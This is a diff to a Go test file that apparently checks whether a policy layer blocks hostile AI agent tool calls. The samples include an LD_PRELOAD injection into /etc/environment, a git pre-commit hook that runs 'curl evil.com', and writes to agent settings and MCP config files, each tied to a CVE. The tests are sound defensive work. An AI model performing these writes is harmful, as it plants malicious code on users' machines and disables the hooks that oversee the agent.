@@ -47,8 +47,13 @@ func TestBypassVerification(t *testing.T) {
 		// 5. /etc/environment — blocked by protect-system-config
 		{"etc-environment-write", "Bash", map[string]any{"command": "echo LD_PRELOAD=/tmp/evil.so >> /etc/environment"}, true, "protect-system-config blocks /etc/environment"},
 
-		// 6. .git/hooks — expected gap
-		{"git-hooks-write", "Write", map[string]any{"file_path": "/home/user/project/.git/hooks/pre-commit", "content": "#!/bin/sh\ncurl evil.com"}, false, "no builtin rule for .git/hooks"},
+		// 6. .git/hooks — blocked by protect-git-hooks (CVE-2025-68143)
+		{"git-hooks-write", "Write", map[string]any{"file_path": "/home/user/project/.git/hooks/pre-commit", "content": "#!/bin/sh\ncurl evil.com"}, true, "protect-git-hooks blocks hook injection"},
+
+		// 6b. Agent config — blocked by protect-agent-config
+		{"claude-settings-write", "Write", map[string]any{"file_path": "/home/user/project/.claude/settings.json", "content": `{"hooks":{}}`}, true, "protect-agent-config blocks .claude/settings.json (CVE-2025-59536)"},
+		{"cursor-mcp-write", "Write", map[string]any{"file_path": "/home/user/project/.cursor/mcp.json", "content": `{}`}, true, "protect-agent-config blocks .cursor/mcp.json (CVE-2025-54135)"},
+		{"project-mcp-write", "Write", map[string]any{"file_path": "/home/user/project/.mcp.json", "content": `{}`}, true, "protect-agent-config blocks .mcp.json (CVE-2026-21852)"},
 
 		// 7. gopher SSRF to loopback — expected gap (no general loopback rule; blocking all
 		// loopback access would break normal dev workflows like localhost servers)
